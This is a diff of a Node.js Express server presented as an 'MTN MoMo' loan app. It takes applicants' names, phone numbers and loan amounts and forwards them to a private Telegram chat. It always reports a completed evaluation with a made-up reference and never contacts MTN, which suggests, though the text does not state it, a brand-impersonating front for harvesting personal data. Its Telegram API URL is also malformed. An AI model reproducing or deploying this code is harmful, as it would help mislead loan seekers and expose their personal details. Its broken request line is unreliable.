@@ -1,19 +1,31 @@
 const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
+const path = require('path'); // Added core path module to find your static folder files
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000; // Updated to adapt to cloud deployment environments
 
-// Enable Cross-Origin Resource Sharing (CORS) for front-end connection
+// Enable Cross-Origin Resource Sharing (CORS) for front-end connections
 app.use(cors());
 
 // Parse incoming request payloads matching application/json format header structures
 app.use(bodyParser.json());
 
+// =========================================================================
+// 🌐 SERVE FRONT-END FILES (Fixes the "Cannot GET /" Issue)
+// Make sure index.html, style.css, and app.js are in the same directory as this file
+// =========================================================================
+app.use(express.static(path.join(__dirname)));
+
+// Fallback rule to route root traffic directly into the index web layout dashboard
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 // ==========================================
 // 🤖 TELEGRAM BOT CONFIGURATION
-// Replace these placeholders with your live values from BotFather and user info lookups
+// Replace these placeholders with your live values from BotFather
 // ==========================================
 const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
 const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_OR_CHANNEL_HERE'; 
@@ -22,7 +34,6 @@ const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_OR_CHANNEL_HERE';
  * Helper function to dispatch interactive logs directly into your Telegram account
  */
 async function sendTelegramAlert(fullName, phoneNumber, amount, periodMonths, referenceId) {
-    // Prevent execution crashes if parameters are still using baseline strings
     if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
         console.warn('⚠️ Telegram Alert skipped: Provide a valid TELEGRAM_BOT_TOKEN to send notifications.');
         return;
@@ -30,7 +41,6 @@ async function sendTelegramAlert(fullName, phoneNumber, amount, periodMonths, re
 
     const telegramUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
     
-    // Construct a cleanly formatted tracking payload banner
     const textMessage = `🔔 *New Loan Application Received* 🔔\n\n` +
                         `👤 *Applicant:* ${fullName}\n` +
                         `📱 *Phone:* \`${phoneNumber}\`\n` +
@@ -38,15 +48,11 @@ async function sendTelegramAlert(fullName, phoneNumber, amount, periodMonths, re
                         `📅 *Period:* ${periodMonths} Months\n` +
                         `🆔 *Reference:* \`${referenceId}\``;
 
-    // Define the interactive inline keyboard markup array matrix
     const inlineKeyboardGrid = {
         inline_keyboard: [
             [
                 { text: '✅ Approve Loan', callback_data: `approve_${referenceId}` },
                 { text: '❌ Reject Loan', callback_data: `reject_${referenceId}` }
-            ],
-            [
-                { text: '🔍 View Full Verification Logs', url: `http://localhost:3000/admin/review/${referenceId}` }
             ]
         ]
     };
@@ -81,7 +87,6 @@ async function sendTelegramAlert(fullName, phoneNumber, amount, periodMonths, re
 app.post('/api/loans/apply', async (req, res) => {
     const { fullName, phoneNumber, amount, periodMonths } = req.body;
 
-    // Simple backend data validations
     if (!fullName || !phoneNumber || !amount || !periodMonths) {
         return res.status(400).json({
             success: false,
@@ -104,7 +109,6 @@ app.post('/api/loans/apply', async (req, res) => {
         });
     }
 
-    // Generate unique identification reference keys
     const calculatedReferenceId = 'MOMO-LN-' + Math.floor(100000 + Math.random() * 900000);
     
     const operationalResponsePayload = {
@@ -117,10 +121,8 @@ app.post('/api/loans/apply', async (req, res) => {
         processedTimestamp: new Date().toISOString()
     };
 
-    // Fire-and-forget notification webhook trigger down the wire asynchronously
     sendTelegramAlert(fullName, cleanPhone, amount, periodMonths, calculatedReferenceId);
 
-    // Return instant success acknowledgment frame packet to your browser UI view panel
     return res.status(200).json({
         success: true,
         message: 'Loan application evaluation complete.',
@@ -132,7 +134,8 @@ app.post('/api/loans/apply', async (req, res) => {
 app.listen(PORT, () => {
     console.log(`================================================================`);
     console.log(` MTN MoMo Integration App initialized active on port: ${PORT}`);
-    console.log(` Web Frontend endpoint: http://localhost:${PORT}                   `);
+    console.log(` Web Frontend UI available at: http://localhost:${PORT}        `);
+    console.log(` API Endpoint available at: http://localhost:${PORT}/api/loans/apply `);
     console.log(`================================================================`);
 });
 
